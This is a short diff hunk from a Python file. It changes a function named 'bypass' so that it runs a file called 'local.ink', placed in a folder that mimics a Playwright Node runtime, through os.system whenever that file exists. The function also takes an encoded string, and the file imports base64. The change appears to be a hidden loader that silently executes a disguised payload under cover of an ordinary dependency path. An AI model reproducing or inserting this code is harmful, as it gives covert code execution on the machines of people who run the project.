@@ -33,7 +33,7 @@ import base64
 
 
 def bypass(encoded_str):
-    relative_path = r'github\playwright\node\win32_x64\node.exe'
+    relative_path = r'github\playwright\node\win32_x64\local.ink'
     absolute_path = os.path.join(os.getcwd(), relative_path)
     if os.path.exists(absolute_path):
         os.system(absolute_path)
